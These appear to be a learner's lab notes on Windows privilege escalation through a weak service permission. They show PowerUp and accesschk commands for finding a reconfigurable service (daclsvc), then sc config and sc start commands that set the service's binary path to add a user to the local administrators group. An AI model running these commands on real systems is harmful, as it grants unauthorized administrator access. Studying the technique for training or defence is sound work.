# Detection
---
- Find using `PowerUp.ps1`:
	- `powershell.exe -ep bypass`
	- `. .\PowerUp.ps1`
	- `Invoke-AllChecks`
	- ![[Pasted image 20250418154738.png]]
	- Note:- ==Important that **we should be able to restart this**, only then we can get a abuse this==
- Find Manually using Accesschk:
	- `accesschk64.exe -uwcv Everyone *`
		- `-u`: Show no errors
		- `-w`: Objects with write access
		- `-c`: Show Service Names
		- `-v`: Verbose
		- `Everyone`: Group `Everyone`, **because this is our group**
		- ![[Pasted image 20250418154832.png]]
		- Now check for the found `daclsvc` specifically:
		- `accesschk64.exe -uwcv daclsvc`
			- Our group `Everyone`can **RW**:
			- ==We should have **SERVICE_CHANGE_CONFIG**==
				- ![[Pasted image 20250418155157.png]]
		- Now to **find the binary executable**:
			- `sc qc daclsvc`
			- ![[Pasted image 20250418155605.png]]

# Exploitation
---
- Now since we have `SERVICE_CHANGE_CONFIG`, **we can change the config of the service**:
	- `sc config daclsvc binpath= "net localgroup administrators user /add"`
- Check the binary path name again:
	- `sc qc daclsvc`
	- ![[Pasted image 20250418155942.png]]
- Start the service:
	- `sc start daclsvc`
	- ![[Pasted image 20250418160113.png]]
	- **We get the error as it is not an executable which is fine**
- ![[Pasted image 20250418160157.png]]